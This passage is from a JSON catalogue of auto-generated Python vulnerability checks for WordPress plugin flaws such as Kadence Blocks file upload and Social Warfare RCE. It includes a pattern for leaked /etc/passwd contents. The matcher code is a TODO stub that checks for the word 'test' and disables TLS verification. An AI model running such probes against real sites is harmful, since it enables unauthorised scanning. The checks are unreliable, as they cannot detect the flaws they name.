sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-kadence-blocks-rce\nName: WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\nSeverity: critical\nDescription: The Kadence Blocks for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the process_fields function in versions up to, and including, 3.1.10. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_kadence_blocks_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-kadence-blocks-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(header_2, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_kadence_blocks_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "wpscan",
          "wordpress",
          "wp-plugin",
          "wp",
          "kadence-blocks",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wp_smart_manager_sqli",
        "name": "Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The Smart Manager For WooCommerce – Stock Management, Bulk Edit & more… WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: duration_2>=7; status_code_2 == 500",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-smart-manager-sqli\nName: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\nSeverity: critical\nDescription: The Smart Manager For WooCommerce – Stock Management, Bulk Edit & more… WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_smart_manager_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-smart-manager-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration_2>=7; status_code_2 == 500'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_smart_manager_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-smart-manager-sqli\nName: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\nSeverity: critical\nDescription: The Smart Manager For WooCommerce – Stock Management, Bulk Edit & more… WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_smart_manager_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-smart-manager-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration_2>=7; status_code_2 == 500'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_smart_manager_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "wpscan",
          "wp",
          "wp-plugin",
          "wordpress",
          "smart-manager-for-wp-e-commerce",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wp_social_warfare_rce",
        "name": "Social Warfare <= 3.5.2 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Unauthenticated remote code execution has been discovered in functionality that handles settings import.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | mot(s) 'No changes made' | status HTTP [500]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-social-warfare-rce\nName: Social Warfare <= 3.5.2 - Remote Code Execution\nSeverity: critical\nDescription: Unauthenticated remote code execution has been discovered in functionality that handles settings import.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_social_warfare_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-social-warfare-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Social Warfare <= 3.5.2 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | mot(s) 'No changes made' | status HTTP [500]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', 'No changes made']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Social Warfare <= 3.5.2 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_social_warfare_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-social-warfare-rce\nName: Social Warfare <= 3.5.2 - Remote Code Execution\nSeverity: critical\nDescription: Unauthenticated remote code execution has been discovered in functionality that handles settings import.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_social_warfare_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-social-warfare-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Social Warfare <= 3.5.2 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | mot(s) 'No changes made' | status HTTP [500]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', 'No changes made']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Social Warfare <= 3.5.2 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_social_warfare_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wordpress",
          "wpscan",
          "wp-plugin",
          "wp",
          "social-warfare",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_zero_spam_sql_injection",
        "name": "WordPress Zero Spam <= 2.1.1 - Blind SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated Blind SQL Injection security vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=7; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
